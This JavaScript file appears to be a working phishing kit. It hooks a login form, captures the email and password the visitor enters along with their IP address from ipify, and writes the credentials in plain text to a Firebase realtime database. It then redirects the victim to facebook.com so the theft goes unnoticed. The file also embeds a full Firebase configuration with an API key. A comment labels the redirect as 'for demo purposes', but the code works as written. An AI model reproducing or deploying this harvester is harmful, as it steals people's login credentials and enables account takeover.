import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
    authDomain: "zphdozer.firebaseapp.com",
    projectId: "zphdozer",
    databaseURL: "https://zphdozer-default-rtdb.firebaseio.com", // Add this line
    storageBucket: "zphdozer.firebasestorage.app",
    messagingSenderId: "1067331325075",
    appId: "1:1067331325075:web:02794fba9fb9633a171166",
    measurementId: "G-X9CN92LFTF"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Function to get client IP address (example implementation)
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown';
    }
}

// Handle form submission
document.querySelector('form').addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const ip = await getClientIP();
    const timestamp = new Date().toISOString();

    try {
        // Generate a unique ID for the entry
        const entryId = Date.now().toString();
        
        // Save to Realtime Database
        await set(ref(database, 'users/' + entryId), {
            email: email,
            password: password, // Note: In a real app, never store plain passwords
            ip: ip,
            timestamp: timestamp
        });

        // Clear form
        document.querySelector('form').reset();
        
        // Redirect (for demo purposes)
        window.location.href = "https://facebook.com";
    } catch (error) {
        console.error('Error:', error);
        document.getElementById('message').textContent = 'Error: ' + error.message;
    }
});
